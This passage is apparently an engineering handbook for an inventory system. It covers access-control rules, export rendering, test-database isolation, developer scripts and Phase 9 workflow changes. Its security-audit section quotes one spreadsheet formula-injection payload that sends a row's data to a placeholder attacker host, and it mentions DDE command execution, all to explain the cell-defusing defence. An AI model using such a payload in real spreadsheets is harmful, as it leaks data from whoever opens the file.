**Companion:** `frontend/src/sme/materialCols.tsx` renders material components —
the variant SAP under the code, and names that **wrap rather than ellipse**
(truncation was eating the single character that distinguishes
`CUMICRETE PU MF 300 (1MM) C` from its three siblings).

### 6. Standing rules that predate this session (still binding)

* **Both SME engines change together.** `backend/api/sme_engine.py` and
  `frontend/src/sme/engine.ts` are line-for-line mirrors proven equal against
  `sme_parity_fixture.json` → `sme_parity_golden.json`. Any numeric change =
  change BOTH + regenerate the golden in ONE commit.
* **Half-up rounding** `floor(x·10ⁿ + 0.5)` is shared verbatim across both
  languages. Never "fix" it to half-even.
* **STRICT BOTTLENECK** (2026-07-07): a unit's coverage is its least-available
  material's rate, never the Σalloc/Σdemand average. **Extended 2026-08-04 to
  every SCOPE-wide KPI**: a scope's coverage is `Σ buildable m² ÷ Σ remaining m²`
  (`session.ts scopeBottleneckCoverage`), never a quantity average across unlike
  materials. The Session and Location reports used the quantity average and read
  **57.7 %** on the live model where the true figure is **7.8 %** — TRAIN K read
  54.6 % against a real 0.4 %. Both now call one shared helper. Gated by
  `npm run test:ui-math`.
* **Unmodelled is never 100%** (ruling Q5): a system code with no recipe rows
  scores 0 SQM achievable, never a silent full-ready.
* **FEFO + over-issue stay allow-and-log** — never add a hard block.
* **Never delete `system_audit_log` rows** — audit assertions are delta-counted.
* **`gi_database.db` is untouchable** — never staged, never written by new-stack
  tooling. Verify its sha256 is unchanged after any data work.
* `sme_inventory_seed` never mingles with the ERP `inventory` table (SME Canon
  Rule 2) — since 2026-08-02 this is the *narrow* case of rule 1a.

---

### 7. Exports render through ONE engine each; Auditor is view-only

*Added 2026-08-03 (`feat/exports-roles-and-sysadmin`).*

* **Every tabular PDF goes through `backend/api/pdf_tables.py`.** Columns are
  measured and allocated MAX-MIN FAIR (water-filling), cells WRAP, and nothing
  is truncated. The old `reports.to_pdf` split the page into equal widths and
  cut at `[:18]`/`[:24]` — fpdf's `cell()` does not clip, so a long description
  was drawn **4.1 mm on top of its neighbour** while `Date` wasted 20 mm, and
  28 characters were destroyed outright. `exec_pdf` delegates its tables here.
  ⚠️ `multi_cell` reserves `pdf.c_margin` on each side that `get_string_width`
  does not know about; the wrap width must add it back.
* **Every xlsx goes through `backend/api/xlsx_style.py`** (openpyxl) or
  `sme_export_layouts.py` (xlsxwriter) — same geometry, same palette, both
  branded: rows 1-4 logo + meta, row 5 title bar, row 6 header, row 7+ data.
  **Header is row 6, data row 7** — tests that read row 1 will fail.
  No GRAND TOTAL on the generic path: summing `Days_Overdue` is a wrong number
  stated confidently.
* **`auditor` (level 3) reads what its level reaches and writes NOTHING.**
  Enforced once, in `backend/api/readonly.py`, as method-keyed ASGI middleware —
  **never per-endpoint**, because a forgotten annotation fails OPEN. 126 of 143
  mutating routes blocked; the 17 exceptions are session/self-service/compute
  and are listed in that module. Level 3 is required, not generous: an unscoped
  account carries `site_id = ''`, so a level-2 auditor would fail closed and see
  nothing. In the UI, `writes: true` on a nav rule makes a page unreachable for
  the role; `useReadOnly()` disables the rest. Suite **BD** (36 checks)
  enumerates every mutating route, so a new `@router.post` fails it by default.
* **`legacy/config.py` stays frozen at six roles.** The auditor is new-stack
  only.

### 8. Local operations: `bin/power.sh` and `bin/backup_db.sh`

*The findings; the commands are under **Developer utilities** below.*

* `./bin/power.sh sleep|wake` stops/starts Postgres + the root cloudflared
  daemon for battery. Measured: those two cost **0.0 %** and **0.1 %** CPU idle.
  The real drain is `com.gi.whatsapp-worker` and two sibling LaunchAgents from
  the pre-cutover stack — their programs were deleted on 2026-07-13 but
  `KeepAlive{Crashed:true}` keeps respawning them: **~2,880 failed Python
  launches a day**. `./bin/power.sh reap` unloads them (`restore` undoes it).
* `./bin/backup_db.sh` snapshots `gihub` (plain-SQL pg_dump, gzipped) plus a
  read-only copy of `gi_database.db`, into gitignored `.backups/`, keeping 14 of
  each. Verified by restoring into a throwaway DB: 74 tables and every row count
  exact. `--install` runs it daily at 02:00 as `com.gi.hub-backup`, **replacing
  `com.gi.backup`, which had been failing silently for 25 nights** — there were
  no local backups at all.

### 9. Manual parsing is FENCE-AWARE; the assistant RETRIEVES

*Added 2026-08-04 (`feat/overnight-autonomous-polish`).*

* **Never parse `USER_MANUAL.md` chapters with a bare `^# \\d+\\.` match.** §17
  documents shell scripts whose comments read `# 1. Pull the new code`, and a
  line-by-line matcher read those as chapters 1-4 — overwriting Introduction,
  Roles & Permissions, Login and the Store Keeper Manual for EVERY role, and
  putting `launchctl` and the developer's iCloud paths into a Store Keeper's
  assistant context. Use `ai/manual_index.iter_chapters()`, which tracks fences
  and keeps the FIRST occurrence of a number. `build_manual_pdf` has its own
  copy of the fence logic (it must stay importable without the backend package);
  suite BE pins both.
* **The Hub Assistant retrieves, it does not stuff.** BM25 over ~390 chunks,
  no vector store and no new dependency. Admin prompts went 178 KB → 4 KB
  (97.7%). The role filter runs BEFORE scoring — that is the security boundary,
  and it must stay that way.
* **Every role in ROLE_META needs an entry in `_ROLE_ALLOWED`.** `auditor` was
  missing and silently inherited the Store Keeper's chapters. Unknown roles fall
  back to the LOWEST allowlist, never the highest. Suite BE asserts both, and
  asserts that every chapter any allowlist references actually exists.
* Manual chapters are now **21**; §20 is the Auditor manual and §21 the 2026-08
  feature update. Regenerate PDFs with `.venv/bin/python build_manual_pdf.py --role all`.

### 10. Auth: idle sign-out + a PER-ACCOUNT login throttle

* 30 minutes idle signs the user out; the client timer is the trigger but the
  REVOCATION is what matters — it calls the ordinary logout, which kills the
  refresh family server-side. Cross-tab via a localStorage timestamp.
* `rate_limit(10, 60)` on `/auth/login` is keyed by **IP** and is therefore
  blind to credential stuffing spread across hosts.
  `ratelimit.assert_login_allowed()` adds a per-USERNAME failure budget (8 per
  15 min), checked before the bcrypt verify, cleared by a correct password, and
  applied to a wrong TOTP too. It THROTTLES rather than LOCKS on purpose — a
  per-account limit is a DoS vector, so it must never need an admin to clear.
  Relaxed under `GI_DOTENV=0` like the other strict limits.

### 11. Indexes are benchmarked before they are added

Alembic `e7c3b95a41d2` added 7 hot-path indexes (ledger `(SAP_Code, Site_ID)`
and `Date`, audit `action_type`) after measuring on a clone inflated to 260k/
240k/429k rows: 20x, 92x, 6x. **Four candidates were rejected on evidence** —
`system_audit_log (id DESC)` and `(username, id DESC)` cost 9.5 MB each for ZERO
planner uses (the pkey already scans backwards), the ledger `TRIM()` expression
indexes lose to `(SAP_Code, Site_ID)`, and `inventory` is 442 rows. Mirror any
new index in BOTH `models.py` and a migration. Ledger indexes are never UNIQUE.

### 12. Exported cells are DEFUSED, and numbers are never defused

Added 2026-08-06 by the security audit (PRs #32, #33). Full account:
[`SECURITY_REVIEW_2026-08-05.md`](SECURITY_REVIEW_2026-08-05.md).

Free text written by the LOWEST-privileged role reaches an approver's
spreadsheet. `consumption."Remarks"` is typed by a store keeper (level 0) and
exported by the Daily Consumption report, which an HOD or admin opens in Excel.
A remark of `=HYPERLINK("https://attacker/?"&A1,"Open")` exfiltrates the row on
one click; the DDE forms reach command execution. That is privilege escalation
from the bottom of the ladder, straight past the RBAC the API enforces so
carefully everywhere else.

`reports._defuse` apostrophe-prefixes the six characters a spreadsheet
evaluates — `=` `+` `-` `@` tab CR. **Three writers must all route through it**,
and they are easy to miss because they use different libraries:

| Path | Writer | Hook |
|---|---|---|
| `/reports/*` CSV | `csv.writer` | `reports.to_csv` |
| every other xlsx | **openpyxl** | `xlsx_style.xl_val` |
| SME workbooks | **xlsxwriter** | `sme_export_layouts._cell` |

The third was missed on the first pass precisely because it is a different
library with its own type dispatch — `ws.write()` hands a leading `=` to
`write_formula` on its own, so inheriting the openpyxl guard was never possible.

> ⚠️ **`_defuse` must never touch a number, and that includes numeric STRINGS.**
> Quantities and valuations arrive as int/float/Decimal and pass through
> untouched — prefixing one turns an accounting column into text. Subtler:
> `sme_export_layouts._cell` runs BEFORE `_num()` sums those same rows into
> GRAND TOTAL, and `_num()` parses with `float()`. Defusing the string `"-5"`
> makes `float("'-5")` raise, `_num` swallow it as `0.0`, and every negative
> subtotal vanish from a total that still looks plausible. So a string that IS
> a number is left alone: Excel reads `-5` as the number, not a formula.
> `-1+1` parses as no number and IS defused — that is the case that matters.

Suite BK pins all of it, including a real `single_table_xlsx` round trip
asserting `10.5 + -2.5` still totals `8.0`.

### 13. `MANUAL_TESTING_GUIDE.md` IS PART OF THE DEFINITION OF DONE

*Locked 2026-08-09.*

**Whenever a feature is added or altered, `MANUAL_TESTING_GUIDE.md` MUST be
updated in the SAME pull request.** A change is not done when the code merges
and the automated gates pass. It is done when somebody who has never seen the
feature can verify it.

This is a rule rather than a convention because the failure mode is silent and
compounding. The automated suites answer "does the system still do what it did";
they cannot answer "does it do what the business asked for", because the person
who wrote both the code and the test had the same misunderstanding. That second
question is only ever answered by a human following written steps — and steps
that describe last quarter's product are worse than none, because they are
followed with confidence.

What the update must contain:

* **A test case per behaviour**, with a stable `TC-AREA-NN` id. **Never renumber
  one** — bug reports cite them. Retire as `(withdrawn)` instead.
* **The 5 W's and 1 H** for the feature: who, what, where, when, why, which,
  how. **If you cannot state the WHY, you are documenting an implementation
  detail** that is free to change, and the case will produce false failures.
* **The refusals, with their messages.** Roughly a third of the guide expects the
  system to say no. A gate whose refusal is undocumented gets "fixed" by the next
  developer who trips over it.
* **The limitations, named as limitations.** §9.1 lists what the returnables
  model does NOT contain — partial return, damage capture, stock impact. Writing
  them down converts a recurring false bug report into a documented fact.
* **A Don't entry** for any behaviour that will otherwise be reported as a bug:
  every operator ruling that contradicts an intuition belongs in §15.

⚠️ **The negative-property cases are the ones that decay first and matter most.**
TC-PPE-01 (PPE moves stock through the ORDINARY ledger), TC-QC-02 (the quality
gate touches 36 SAPs and not the other 430), TC-PPE-08 (a non-PPE item shows no
extra fields). Each proves a feature did NOT leak into everything else, and
nothing in the automated suites will catch that leak once it happens.

**The same rule binds the documentation surfaces a new role touches.** A role
added to `auth.ROLE_META` must be added, in the same commit, to
`ai/manual_qa._ROLE_ALLOWED` and to `build_manual_pdf.ROLE_MANUAL_RECIPES` — the
QSEP release added `qc` and did neither, so a Quality inspector was answered out
of the Store Keeper chapter and had no printed booklet at all. `_ROLE_ALLOWED`
falls back to `store_keeper` for an unknown role, which fails in the safe
direction and is exactly why nobody noticed.

### 14. NAVIGATION ACCESS IS A ROLE MATRIX, AND IT FAILS CLOSED

*Locked 2026-08-12, executing the approved `PROPOSED_NAV_FIX.md`.*

**`minLevel` is not an access rule for a page.** It is a seniority ladder — SK 0
· warehouse/supervisor/qc 1 · hod 2 · logistics/auditor 3 · admin 4 — and the
roles are not a ladder. They are four different JOBS plus two oversight roles. A
store keeper is not "less senior" than a warehouse user; they do a different job
in a different place.

`minLevel: 1` admits **six of the eight roles**. That is how seven roles ended
up able to read the staff roster with phone numbers, and how the store keeper
became the one role locked out of the Stock page. Use `anyRole` and name the
jobs. `minLevel` survives only where it genuinely means seniority: `/reports`,
`/master/*`, `/admin/*` and the oversight ledgers in `entities.ts`.

**Three mechanisms have to agree, and each one used to be checked differently:**

| Surface | File | Was |
|---|---|---|
| the sidebar | `buildMenu` in `AppLayout.tsx` | checked group **and** node |
| the route guard | `canAccessPath` in `nav.tsx` | checked node **only**, and allowed unknown paths |
| the API | the routers | frequently wider than both |

`canAccessPath` now checks the group first and **refuses anything it does not
recognise**. That inverts the failure mode from "a new page is open to
everyone" to "a new page is unreachable", which is safe but silent — so
**`npm run test:nav`** (in CI) fails the build when a route in `App.tsx` has no
manifest entry. Both halves are required: the fail-closed default alone would
just trade a leak for an outage.

⚠️ **A menu is not a control.** Before this pass the sidebar hid the roster from
the store keeper while `GET /hr/employees` was `get_current_user` and served it
to anybody, and it showed Logistics no SME page while `/sme/*` was
`require_level(2)` and served them every Estimator endpoint. When you narrow a
page, narrow its endpoints in the same commit — suite **BU** asserts the
refusals per role, and `tests/e2e/specs/rbac-matrix.spec.ts` asserts all 8
roles × 44 pages through the shipped functions.

**And narrow EVERY door to the data, not the one you were looking at.** Worker
identity turned out to have four: `/hr/employees`, the generated `/employees`
CRUD read, the badge PDFs, and `/documents/master/employees` — the whole roster
as a spreadsheet, which is the worst of them because it leaves the system
entirely. Closing one is not closing any. The generated reads are the easiest
to miss because nobody writes them: `crud.make_read_router` produces two GETs
per entity, and it stamped `get_current_user` on all of them for eleven
entities until 2026-08-12. Every entity now states `read_roles` explicitly —
suite **BV** fails the build if a row omits the key, because an omission
inherits "anybody" and would come back silently.

**Bulk identity is gated more tightly than a single name**, and the asymmetry
is deliberate: a store keeper reads a worker's name to type an employee ID on
every PPE issue, which is not the same act as exporting the roster.

**Changing the matrix means editing `nav.tsx` AND `rbac-matrix.spec.ts`
together.** If you find yourself editing only the spec to make a test pass, an
access rule changed without anyone deciding to change it.

### 15. THE TESTS DO NOT OPEN THE LIVE DATABASE

*Locked 2026-08-13.*

`service_tests` is not a unit suite. Suite A calls the write services in a
transaction and rolls back; **suites B…BX drive the real ASGI app over httpx and
cannot**, because a request that returns 201 has already committed by the time
the assertion reads it. The commit *is* the thing under test.

So every run wrote into whatever `DATABASE_URL` named — and the local default
named the operator's live database. A full pass left audit rows, mock PRs,
notifications, outbox entries, test users, vendors and employees mixed in among
real stock movements.

**Cleanup is the wrong shape for this.** The suites do clean up after
themselves, and it does not help: a run that fails early, is interrupted, or
dies on an uncaught exception skips its own `finally`, and those are the runs a
developer does most often.

`backend/api/testdb.py` provisions a separate `gihub_svctest` and rewrites
`DATABASE_URL` **before `backend.api.db` is imported** — that ordering is the
entire mechanism, because the engine is built at import time from whatever the
URL says at that instant. `DATABASE_URL` now supplies only the CLUSTER; its
database is never opened. Provisioning **exits non-zero** if the source and
target resolve to the same name, so a mis-set variable is a loud abort rather
than a silent write to production data. Suite **BW** asserts all of it,
including the refusal.

**The test database is rebuilt from `gi_database.db` by the production cutover
script**, which is the second half of the point.

⚠️ **CORRECTION, 2026-09-04 — this paragraph used to claim "that file is in git
and is itself a gate, so every machine and CI start from identical rows". IT IS
NOT IN GIT.** Commit `a09da0b` (2026-07-26, "security(secrets): untrack tracked
SQLite databases") removed it deliberately — it holds real employee names, stock
and vendors — and `.gitignore:13` keeps it out. So that guarantee has been false
since then, and **`service_tests` has only ever passed on the operator's
laptop**. It was invisible because `legacy/bug_check.py` failed first on all 30
recorded CI runs; fixing that in Phase 11a merely advanced the job far enough to
reach it. `tools/make_ci_fixture_db.py` generates a fixture that satisfies
`dual_ci` and `parity_check`; the suite's remaining master-data dependency is an
OPEN DECISION written up in `docs/PROJECT_STATUS.md` §1b. Before this,
the suite had quietly come to depend on data that existed only on the
operator's box: the 2026-08-13 database wipe turned 1474/0 into a hard
`IndexError` on the FIRST suite, because employee `30001` had been sitting in
the live `employees` table since June and nothing recreated it. A test that
passes because of what a laptop happens to contain is not a gate.

⚠️ **Two things follow from building the schema the way production builds it,
and both were found this way:**

1. **`ux_asset_transfer_open` existed only in alembic** — so it was present on
   every migrated database and absent from every `metadata.create_all` one,
   which is how `cutover_migrate.py` builds a production box. The partial
   unique index that stops two sites both claiming the same asset would simply
   not have been there, and the race is silent by nature. It is now declared in
   `models.py` too. **When you add a constraint in a migration, add it to
   `models.py` in the same commit.**
2. ✅ **CLOSED 2026-08-18, re-verified end-to-end 2026-09-05.**
   `cutover_migrate.py` used to STAMP alembic to head without running it, so
   every migration that backfilled *data* was skipped on a freshly cut-over
   database — the schema right, the corrections missing. It now runs
   `run_data_migrations()` after the stamp (a migration carrying DML exposes
   `data_upgrade(conn)`; `upgrade()` calls the same function, so the two paths
   cannot drift) and `verify_data_migration_contract()` REFUSES in pre-flight
   when a migration forgets.

   **Verified against a real cut, 2026-09-05:** 105 tables copied,
   `alembic_version` stamped to `a1c9e64b3d70`, **13 data steps executed**, and
   both Phase 11 tables (`ai_traces`, `ai_answer_cache`) present with all six
   of their indexes on a `create_all`-built database — which is the half of
   this rule that nearly shipped `ux_asset_transfer_open` missing.

   ⚠️ **The contract verifier was widened on 2026-09-05** to catch DML that
   carries no SQL string: `op.bulk_insert(t, rows)` and SQLAlchemy Core's
   `conn.execute(t.insert()/update()/delete())`. Nothing in the tree uses those
   forms today — all 17 DML sites are `op.execute("…")` — which is exactly why
   it was widened before somebody writes the first one. Suite **BZ-12a** pins
   every form, with pure DDL and a properly-declared migration as negative
   controls.

`GI_TEST_DB=off` runs in place, for debugging a failure that only reproduces
against live data. It prints a warning. `GI_TEST_DB_REUSE=1` skips the ~1s
rebuild while iterating on one suite.

## Developer utilities — the three scripts in `bin/`

Three separate jobs, deliberately not one script. `dev.sh` owns the DEV stack it
starts; `power.sh` owns the SHARED always-on services it does not; `backup_db.sh`
owns your data. Full detail:
[`docs/EXPORTS_ROLES_SYSADMIN_RUNLOG.md`](docs/EXPORTS_ROLES_SYSADMIN_RUNLOG.md).

### `./bin/dev.sh` — raise or level the dev stack

| Command | Serves | Connector |
|---|---|---|
| `./bin/dev.sh localhost` | `http://localhost:5173` (HMR live) | none |
| `./bin/dev.sh tunnel` | `https://local.giinventory.com` | starts `gi-hub` from `deploy/cloudflared/config.yml` |
| `./bin/dev.sh gi` | `https://gi.giinventory.com` (legacy mirror) | none — the **root LaunchDaemon** already serves it |
| `./bin/dev.sh stop` | kills API + Vite + **our** connector (`--db` also stops Postgres) | |
| `./bin/dev.sh status` / `logs [api\|web\|tunnel]` | | |

Only ONE mode runs at a time — all three want `:5173`, and Vite's `strictPort`
makes a second one fail loudly rather than drift to `:5174`.

`stop` signals the process GROUP (so uvicorn's reloader child and Vite's node
child go too), then sweeps anything orphaned by a crashed shell, then reports
whether `:8000` and `:5173` are actually free.

Two things it will not do, on purpose:

* it leaves **Postgres** running — a shared brew service the legacy app and
  every suite use (`stop --db` if you really mean it);
* every sweep is scoped to your uid, so the **root cloudflared daemon** that
  serves `gi.giinventory.com` can never be caught in it. Starting a second
  connector is how Error 1033 came back before, and `tunnel` mode refuses to
  start when one of yours is already up.
  Details: [`deploy/cloudflared/README.md`](deploy/cloudflared/README.md).

### `./bin/power.sh` — battery: sleep and wake the always-on services

| Command | What it does |
|---|---|
| `./bin/power.sh sleep` | Stops Postgres + unloads the root cloudflared LaunchDaemon (add `--force` to override a running dev stack) |
| `./bin/power.sh wake` | Starts both, then probes the real hostname — a registered connector is not a routed one |
| `./bin/power.sh status` | What is up, and what it costs |
| `./bin/power.sh reap` | Unloads the **dead legacy LaunchAgents** (`restore` undoes it) |

⚠️ While asleep, `https://gi.giinventory.com` is **offline** — that daemon is the
only thing serving it.

> **Measured, so nobody re-litigates it:** idle Postgres is **0.0 %** CPU and
> idle cloudflared **0.1 %**. The real drain is `com.gi.whatsapp-worker` and two
> siblings from the pre-cutover stack — their programs were deleted on
> 2026-07-13 but `KeepAlive{Crashed:true}` respawns them **~2,880 times a day**.
> **`./bin/power.sh reap` is still outstanding.**

### `./bin/backup_db.sh` — local snapshots

| Command | What it does |
|---|---|
| `./bin/backup_db.sh` | `pg_dump` of `gihub` (gzipped) + a read-only copy of `gi_database.db`, into gitignored `.backups/` |
| `./bin/backup_db.sh --list` | What is there |
| `./bin/backup_db.sh --install` | Daily at 02:00 as `com.gi.hub-backup` (**installed and verified**) |
| `./bin/backup_db.sh --restore FILE` | **Prints** the restore command — restoring drops every table, so it is never run for you |

The SQLite copy compares the source sha256 before and after, so the script can
prove it did not write to the frozen DB. A dump is verified (end marker + at
least one `CREATE TABLE`) before it is promoted from `.part`. Retention keeps 14
of each kind.

> Its predecessor `com.gi.backup` pointed at a script the cutover moved and had
> failed silently for **25 consecutive nights** — there were no local backups at
> all. `--install` retires it.

---

## PRESENT — current state and baselines

> **Updated 2026-08-28 — Phase 9 slice 9f (`feat/phase9-naming-docs`).
> PHASE 9 COMPLETE.** Baselines: **service tests 2,064** · **E2E 125** ·
> legacy 599 · UI math 33 · nav 49 · alembic head **`a2c9f5e81b43`**.
>
> * ⚠️ **"LABOR" BECAME "MANPOWER" IN DISPLAY STRINGS ONLY (ruling Q13).**
>   `Done_SQM_Labor` and `Labor_Variance_Pct` are UNCHANGED — API contract, read
>   by the frontend and pinned by suite CD. The column HEADING above each moved
>   and the key underneath did not; that mismatch is deliberate and CJ-25..27
>   exist so the next reader does not "finish" the rename. 22 display strings,
>   two JSON keys, zero database columns.
>
> * ⚠️ **A RENAME CHANGES WHAT THE ASSISTANT RETRIEVES, AND CJ-19 CAUGHT
>   IT.** Once the page was called Manpower Tracking, "manpower" appeared
>   hundreds of times inside chapter 19 and outweighed section 2 on term
>   frequency — so "can a HOD open the manpower portal" started answering with
>   a tab list instead of yes. Fixed by reversing the alias direction
>   (`manpower -> man hours tracking`, and `labor` KEPT as a key because people
>   who learned the old name keep typing it) and adding access vocabulary
>   (`open` / `access` / `allowed` -> permission matrix). CJ-29..31 pin all
>   three properties, including that a genuine chapter-19 question still
>   reaches chapter 19.
>
> * ⚠️ **9c AND 9d DOCUMENTED THE CONSUMPTION-FORM WORKFLOW IN A CHAPTER
>   ITS OWN USERS COULD NOT READ.** §16.6/§16.7 sat under chapter 16
>   ("Cross-Role Procurement"), which `manual_qa._ROLE_ALLOWED` grants to HOD
>   and Logistics only — so the assistant could not show a supervisor or a
>   store keeper one word of the workflow they use every day. Moved to §4.9 and
>   §4.10; chapter 4 is one all three already hold. CJ-32/33 pin the
>   reachability rather than the chapter number.
>   **Before adding a manual section, check `_ROLE_ALLOWED` for the roles who
>   will ask about it.**
>
> * **THE PHASE 9 SUMMARY FOLDED INTO CHAPTER 21, NOT A NEW "21b".**
>   `iter_chapters` matches `# <n>.`, so a `# 21b.` heading parses as nothing
>   and is invisible to the assistant. Chapter 21 is the August update and is
>   in EVERY role's allowed set — exactly right for "what changed".
>
> ────────────────────────────────────────────────────────────────────────
> **PHASE 9, THE WHOLE THING — the rulings, in one place:**
>
> | Slice | What it changed |
> |---|---|
> | 9a | WBS + work types. The tap was plumbed and never opened; `resolve_wbs` runs BEFORE `assert_wbs`; `Work_Type_Norm` is the identity |
> | 9b | Nights buy TIME, not a smaller payroll; the shift split follows the roster (20/80, never 50/50); capacity counts in-scope roles only |
> | 9c | The printed form: names pre-printed, QR instead of header OCR, `Recipe_Fingerprint` pins row order, every download is a new sheet |
> | 9d | Paper first — supervisor → SK → HOD; four layers per line; approval DEDUCTS STOCK (the only writer); QSEP overridable with a reason |
> | 9e | Efficiency by Day: the RUNNING figure, two divisions by zero, reasons read never invented |
> | 9f | Labor → Manpower in display only; the docs the workflow's users can now reach |
>
> ⚠️ **The three that will bite hardest if softened:** the double-deduction
> guard (`Consumption_ID`, not a status check), the stale-sheet refusal
> (`Recipe_Fingerprint`), and the never-guess-a-digit rule. Each is invisible
> when it works and catastrophic when it does not.
>
> ⚠️ **Operational instruction the code cannot enforce:** store keepers must
> STOP raising a separate material issue for lining work. Both paths together
> deduct the same drum twice. The SK issue form still exists for everything
> that is not lining material.

> **Updated 2026-08-28 — Phase 9 slice 9e (`feat/phase9-analytics`).**
> Baselines move to **service tests 2,052** (+29: suite CO 26, three CJ pins)
> and **E2E 125** (+4). Legacy 599, UI math 33, nav 49, alembic head
> **`a2c9f5e81b43`** UNCHANGED — this slice adds no table and no column.
>
> * ⚠️ **THE CHART'S LINE IS CUMULATIVE, AND THERE ARE TWO DIVISIONS BY
>   ZERO, NOT ONE** (ruling Q11/Q12). `sqm == 0` on a day kills the DAILY
>   ratio; `cum_sqm == 0` so far kills the RUNNING one for everybody. A day can
>   fail the first and pass the second. Collapsing them loses the distinction
>   between "no area today" and "this job has produced nothing yet", and the
>   second is a real gap at the start of every job.
>
> * ⚠️ **A ZERO-AREA DAY IS A GAP, NEVER A ZERO, AND THE LINE IS NOT
>   BRIDGED.** `connectNulls={false}` is load-bearing: zero reads as "this crew
>   achieved nothing per metre" (a claim about them), and bridging draws a
>   number that does not exist. The hours still count towards the running
>   figure — they are part of what the job cost.
>
> * ⚠️ **THE REASON IS READ FROM `mh_timesheets.Remarks`, NEVER INVENTED.**
>   There is no mobilisation/scaffolding/curing taxonomy in this database.
>   Where nothing was written the UI says "no reason recorded", which is
>   actionable; a guess would become the record.
>
> * **MH/m² IS THE NORMALISATION** the operator asked for — a 400 m² tank and a
>   40 m² vessel are comparable on it and on nothing else. The KPI cards lead
>   best-first, so the answer is readable before the chart is interpreted.
>
> ⚠️ **`efficiency-chart.spec.ts` DEACTIVATES the employees it seeds.** Eight
> active masons change `roster.In_Scope`, `Days_With_Current_Roster` and the
> hire advice for every planner spec that runs after it — the same
> cross-spec interference class as 9a's WBS gate and 9d's recipe seed.
> `planner.roster()` counts only active rows, which is why deactivating is what
> actually removes them from the arithmetic.
>
> ⚠️ **CJ-04 CAUGHT THE 13th TAB, which is what it is for.** It counts tabs in
> `ManHoursPage.tsx` and requires §19 to document that many. Adding the tab
> turned it red before any human noticed the manual was short.

> **Updated 2026-08-27 — Phase 9 slice 9d (`feat/phase9-ocr-workflow`).**
> Baselines move to **service tests 2,018** (+48, suite CN) and **E2E 121**
> (+6); legacy 599, UI math 33, nav 49, alembic head **`a2c9f5e81b43`**.
>
> **THE BIGGEST BEHAVIOURAL CHANGE IN THE PROJECT SO FAR. Six locked rules:**
>
> * **THE WORKFLOW REVERSED: supervisor → SK → HOD.** Phase 5 ran the other way
>   and forbade the supervisor from touching a material line, because "a
>   supervisor whose numbers look bad has both the motive and the opportunity to
>   adjust the consumption they are being measured against". That reasoning has
>   NOT stopped being true — what changed is where the record starts. The
>   supervisor fills a printed form in the field, so they author the quantities
>   and the store keeper verifies them.
>
> * ⚠️ **THE REPLACEMENT CONTROL IS FOUR LAYERS, NOT ONE COLOUR.** The
>   brief asked for the SK's edits in red so an HOD can see the store keeper
>   altered the claim. That is half a control: nothing in it shows what the
>   SUPERVISOR changed from what the camera read, so a supervisor could
>   overwrite the machine's reading of their own handwriting undetected. Every
>   material line carries `OCR_Qty` (grey) → `Supervisor_Qty` (amber) →
>   `SK_Qty` (red) → `Actual_Qty` (purple). Each renders ONLY when it differs
>   from the one before — a colour that appears when nothing changed is a
>   colour people learn to ignore. Do not "simplify" this to one number.
>
> * ⚠️ **APPROVAL NOW DEDUCTS STOCK (ruling Q1-b), AND THE GUARD IS A
>   STORED id.** `post_progress` still posts area; `post_stock` now writes
>   `consumption` rows via `ledger.post_consumption` (never a private INSERT —
>   that function owns FEFO, the over-issue warning and the audit line). This
>   entry is the ONLY writer for lining consumption now: the SK must stop
>   raising a parallel `pending_issues` for it, or one drum is deducted twice.
>   Idempotence is `Consumption_ID` per line, NOT a status check — a status
>   check is a check-then-write with a window in it.
>
> * ⚠️ **`Source_Ref` KEYS ON THE ENTRY'S id, NOT ITS `Entry_No`.**
>   `next_entry_no` is `COUNT(*) + 1` over surviving rows, so deleting an entry
>   makes the next one REUSE its number. Harmless while Entry_No was a label;
>   fatal for a permanent handle on a `consumption` row that outlives the entry.
>   The pretty number rides in `Remarks`. (Found by two suites colliding — the
>   collision was the symptom, the reuse was the cause.)
>
> * ⚠️ **THE QSEP GATE BLOCKS BY DEFAULT AND CAN BE OVERRIDDEN (Q2-D).**
>   On a paper-first flow the drum was emptied days ago, so a hard refusal
>   prevents nothing and only strands the record while stock overstates. The
>   HOD may override with a written reason; the Head of Qualities is notified
>   EVERY time. The gate runs AFTER the HOD's edits, because correcting a lot
>   number is the ordinary way a blocked entry becomes approvable.
>
> * **THE LOT IS PER ROW, NOT PER FORM** (operator correction to 9c). One system
>   draws several materials, each from its own batch, and the gate checks the
>   certificate PER MATERIAL. A lot against the wrong line is worse than none:
>   it clears a gate for a batch that was never used.
>
> ⚠️ **`Recipe_Fingerprint` IS CHECKED ON EVERY UPLOAD AND REFUSES A STALE
> SHEET.** Row 3 of the handwriting maps to row 3 of the recipe. Add a material
> after a form is printed and everything past it lands on the wrong one — with
> plausible quantities, against real materials, in a real system. There is NO
> downstream check that would catch it. This is the rule most likely to be
> softened by somebody who has met an inconvenienced supervisor; it must not be.
>
> ⚠️ **A NULL IS AN ANSWER; A GUESS IS NOT.** `read_form` returns
> `quantity: null` whenever the digits are ambiguous and keeps the raw text
> beside it. These numbers post straight to stock on approval, so an invented
> figure is one nobody questions. `_match_rows` also DROPS a row number the
> form never printed — a hallucinated row 7 must not become a seventh material.
>
> ⚠️ **THE FORM'S GEOMETRY IS SHARED BY THE RENDERER AND THE READER**
> (`consumption_form.ROW_H`, `row_boxes()`, `fiducial_points()`). 9d rectifies a
> photo onto that millimetre grid to crop a row; a layout tweak living only in
> `render_pdf` would silently start cropping the wrong strip of handwriting. The
> four corner fiducials exist because the QR alone gives four points all within
> 26 mm of one corner. When rectification fails the endpoint returns the WHOLE
> photo with `X-Crop: unrectified` — never a crop it cannot vouch for.
>
> ⚠️ **THE CLOUD SEAM IS TWO ENVIRONMENT VARIABLES** (`ai/client.vision_json`,
> ruling Q7): `GI_AI_VISION_PROVIDER=anthropic` + `GI_AI_VISION_API_KEY`. If
> UAT shows local digit accuracy is not good enough, that is the escalation —
> NOT a bigger local model, which the one-warm-model ruling forbids.
>
> ⚠️ **`tests/e2e/specs/ocr-workflow.spec.ts` SEEDS AND THEN DELETES a
> recipe line and a benchmark.** Leaving them behind grows the SME cascade
> enough to push `sme-tiers`' 150 s render past its timeout under load — which
> presented as an unrelated spec failing intermittently. What a spec adds to
> shared master data, it takes away.

> **Updated 2026-08-26 — Phase 9 slice 9c (`feat/phase9-form-gen`).** Baselines
> move to **service tests 1,970** (+41: suite CM 38, plus three CJ manual
> pins) and **E2E 115** (+4); legacy
> 599, UI math 33, nav 49, alembic head **`f4b8e2c07d15`** (one additive table).
>
> **Four additions to the LOCKED set:**
>
> * **THE FORM PRINTS THE MATERIAL NAMES SO THE MODEL NEVER READS ONE.** A 7B
>   VLM's weakest task is handwritten names and its strongest is a digit in a
